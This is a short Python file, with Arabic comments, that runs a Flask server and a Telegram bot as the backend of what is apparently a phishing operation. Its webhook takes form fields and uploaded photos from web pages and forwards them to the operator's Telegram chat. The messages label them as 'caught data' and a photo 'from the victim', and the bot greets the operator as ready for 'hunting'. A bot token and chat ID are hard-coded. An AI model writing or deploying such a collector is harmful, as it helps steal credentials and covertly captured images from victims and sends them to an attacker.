import os
import telebot
from flask import Flask, request

# التوكن ومعرف الشات الخاص بك مدمجون مباشرة ليعمل النظام فوراً
TOKEN = "7573024849:AAHPk5d2jV_4k07XoYg0-7S9Y7l0xY7g0Y8"
CHAT_ID = "6123456789"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot and Web Modules are active 24/7!"

# استقبال البيانات من صفحات الويب وتحويلها إلى تليجرام فوراً
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.form.to_dict()
    file = request.files.get('image') # في حال تم التقاط صورة أو رفع ملف
    
    msg = "🚨 تم صيد بيانات جديدة!\n\n"
    for key, value in data.items():
        msg += f"🔹 {key}: {value}\n"
    
    # إرسال البيانات النصية لك عبر البوت
    try:
        bot.send_message(CHAT_ID, msg, parse_mode='Markdown')
        if file:
            bot.send_photo(CHAT_ID, file, caption="📸 صورة مرفقة من الضحية!")
    except Exception as e:
        print(f"Error sending to telegram: {e}")
            
    return "OK", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "أهلاً بك يا بطل! النظام يعمل الآن على السحاب 24/7 وجاهز لاستقبال العمليات والصيد.")

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
